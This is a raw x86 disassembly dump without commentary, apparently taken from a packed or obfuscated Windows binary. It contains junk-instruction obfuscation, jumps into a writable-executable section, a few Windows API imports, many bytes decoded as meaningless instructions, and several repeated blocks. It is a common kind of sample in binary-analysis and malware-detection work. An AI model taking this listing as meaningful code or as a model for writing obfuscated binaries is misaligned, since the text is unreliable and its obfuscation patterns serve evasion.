jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
sub_4ba8b4
pushfd
push [ esp ]
lea esp [ esp + 0xc ]
jne rwxdata
jpe rwxdata
push 0x332482c5
pushad
push [ esp + 0x1c ]
stosb [ edi ]
mov [ esp + 0x4 ] 0x54
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4ba94a
call sub_515658
dec ebp
push ebx
int3
jbe rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
outsb
pushad
jmp rwxdata
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
jmp rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
